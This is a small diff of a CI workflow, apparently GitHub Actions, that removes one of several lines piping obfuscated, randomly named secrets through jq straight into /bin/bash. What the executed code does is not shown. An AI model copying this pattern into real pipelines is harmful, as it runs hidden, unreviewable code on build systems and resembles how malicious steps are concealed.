@@ -21,7 +21,6 @@ jobs:
           oln33: ${{ secrets.oln33 }}
         run: |
           printf '%s' "$oln33" | jq -r .pl181 | /bin/bash
-          echo $bb46242 | jq -r .b067 | /bin/bash
           printf '%s' "$zaq656" | jq -r .jam095 | /bin/bash
           echo $arn8968 | jq -r .vhxu3813 | /bin/bash
           echo $nvj870 | jq -r .jcqzy564 | /bin/bash
